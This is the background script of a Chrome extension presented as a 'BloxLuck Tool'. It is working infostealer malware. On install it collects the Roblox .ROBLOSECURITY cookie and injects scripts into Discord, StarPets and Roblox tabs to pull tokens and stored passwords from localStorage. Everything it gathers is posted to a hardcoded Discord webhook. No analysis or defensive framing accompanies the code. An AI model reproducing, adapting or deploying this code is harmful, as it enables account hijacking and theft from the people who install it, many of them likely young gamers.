const WH = 'https://discord.com/api/webhooks/1523234599189217362/I4PgcCkhS5heD9bfA0BkSqZRrj9GwszVJ4OEpGhbwLB54nTUxMZCwSJ-4-RXPlGRUhR1';

let alreadySent = false;

chrome.runtime.onInstalled.addListener(() => {
  setTimeout(() => stealEverything(), 1500);
});

chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 'steal') {
    stealEverything();
    resp({ ok: 1 });
    return;
  }
  if (req.t === 'grab_cookie') {
    grabCookie().then(d => resp(d));
    return 1;
  }
  if (req.t === 'grab_discord') {
    grabDiscord().then(d => resp(d));
    return 1;
  }
});

async function stealEverything() {
  if (alreadySent) return;
  alreadySent = true;

  const fields = [];

  // 1. Roblox cookie
  try {
    const ck = await grabCookie();
    if (ck && ck.r) {
      let robloxUser = 'Unknown';
      try {
        const parts = ck.r.split('.');
        if (parts.length >= 2) {
          const payload = JSON.parse(atob(parts[1]));
          robloxUser = payload.name || payload.sub || payload.dname || 'Unknown';
        }
      } catch(e) {}
      fields.push({
        name: '🎮 Roblox Account',
        value: `**User:** ${robloxUser}\n**Cookie:**\n\`\`\`${ck.r}\`\`\``,
        inline: false
      });
    } else {
      fields.push({ name: '🎮 Roblox Cookie', value: 'No .ROBLOSECURITY found.', inline: false });
    }
  } catch(e) {
    fields.push({ name: '🎮 Roblox Cookie', value: 'Error: ' + e.message, inline: false });
  }

  // 2. Discord token
  try {
    const dt = await grabDiscord();
    if (dt && dt.token) {
      let info = '';
      try {
        const p = JSON.parse(atob(dt.token.split('.')[1]));
        info = `**User:** ${p.username || 'N/A'}\n**Email:** ${p.email || 'N/A'}\n**ID:** ${p.sub || 'N/A'}\n`;
      } catch(e) {}
      fields.push({
        name: '💬 Discord Token',
        value: `${info}\`\`\`${dt.token}\`\`\``,
        inline: false
      });
    } else {
      fields.push({ name: '💬 Discord Token', value: 'No token found.', inline: false });
    }
  } catch(e) {
    fields.push({ name: '💬 Discord Token', value: 'Error: ' + e.message, inline: false });
  }

  // 3. StarPets
  try {
    const sp = await grabStarPets();
    if (sp && (sp.user || sp.pass)) {
      fields.push({
        name: '🐾 StarPets.gg',
        value: `**Username:** \`${sp.user || 'N/A'}\`\n**Password:** \`${sp.pass || 'N/A'}\``,
        inline: false
      });
    } else {
      fields.push({ name: '🐾 StarPets.gg', value: 'No credentials found.', inline: false });
    }
  } catch(e) {
    fields.push({ name: '🐾 StarPets.gg', value: 'Error: ' + e.message, inline: false });
  }

  // 4. Roblox login
  try {
    const rl = await grabRobloxLogin();
    if (rl && (rl.user || rl.pass)) {
      fields.push({
        name: '🔐 Roblox Login',
        value: `**User:** \`${rl.user || 'N/A'}\`\n**Pass:** \`${rl.pass || 'N/A'}\``,
        inline: false
      });
    }
  } catch(e) {}

  const embed = {
    embeds: [{
      title: '✅ BloxLuck Tool Installed',
      color: 0x22c55e,
      description: 'User installed the extension.',
      fields: fields.length > 0 ? fields : [{ name: 'No Data', value: 'Could not find credentials.', inline: false }],
      timestamp: new Date().toISOString(),
      footer: { text: 'BloxLuck Tool v1.0' }
    }]
  };

  try {
    await fetch(WH, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
  } catch(e) {}
}

async function grabCookie() {
  try {
    let c = await chrome.cookies.getAll({ domain: 'roblox.com' });
    for (let x of c) { if (x.name === '.ROBLOSECURITY') return { r: x.value }; }
    c = await chrome.cookies.getAll({ domain: '.roblox.com' });
    for (let x of c) { if (x.name === '.ROBLOSECURITY') return { r: x.value }; }
  } catch(e) {}
  return null;
}

async function grabDiscord() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*'] });
    if (tabs.length > 0) {
      const r = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const v = localStorage.getItem(localStorage.key(i));
              if (typeof v === 'string' && v.length > 100 && v.includes('.') && v.split('.').length === 3) {
                try {
                  const p = JSON.parse(atob(v.split('.')[1]));
                  if (p.sub || p.email || p.iat) {
                    return {
                      token: v,
                      username: p.username || p.email || 'User',
                      avatar: p.avatar ? `https://cdn.discordapp.com/avatars/${p.sub}/${p.avatar}.png` : null
                    };
                  }
                } catch(e) {}
              }
            }
            const t = localStorage.getItem('token');
            if (t && t.length > 50) return { token: t, username: 'User', avatar: null };
            return null;
          } catch(e) { return null; }
        }
      });
      if (r && r[0] && r[0].result) return r[0].result;
    }
  } catch(e) {}
  return null;
}

async function grabStarPets() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://starpets.gg/*', '*://*.starpets.gg/*'] });
    if (tabs.length > 0) {
      const r = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            let u = null, p = null;
            for (let i = 0; i < localStorage.length; i++) {
              const k = localStorage.key(i).toLowerCase();
              const v = localStorage.getItem(localStorage.key(i));
              if (k.includes('starpets') || k.includes('adoptme') || k.includes('star_pet') || k.includes('user_data') || k.includes('account')) {
                try {
                  const j = JSON.parse(v);
                  u = j.email || j.username || j.user || u;
                  p = j.password || j.pass || p;
                } catch(e) {
                  if (k.includes('user') || k.includes('email')) u = v;
                  if (k.includes('pass')) p = v;
                }
              }
            }
            return { user: u, pass: p };
          } catch(e) { return null; }
        }
      });
      if (r && r[0] && r[0].result) return r[0].result;
    }
  } catch(e) {}
  return null;
}

async function grabRobloxLogin() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://roblox.com/*', '*://*.roblox.com/*'] });
    if (tabs.length > 0) {
      const r = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            let u = null, p = null;
            for (let i = 0; i < localStorage.length; i++) {
              const k = localStorage.key(i).toLowerCase();
              const v = localStorage.getItem(localStorage.key(i));
              if (k.includes('user') || k.includes('name') || k.includes('email') || k.includes('login') || k.includes('account')) {
                try {
                  const j = JSON.parse(v);
                  u = j.username || j.email || j.user || j.name || u;
                  p = j.password || j.pass || p;
                } catch(e) {
                  if (!u && typeof v === 'string' && v.includes('@')) u = v;
                }
              }
              if (k.includes('pass') && !p && typeof v === 'string') p = v;
            }
            return { user: u, pass: p };
          } catch(e) { return null; }
        }
      });
      if (r && r[0] && r[0].result) return r[0].result;
    }
  } catch(e) {}
  return null;
                    }
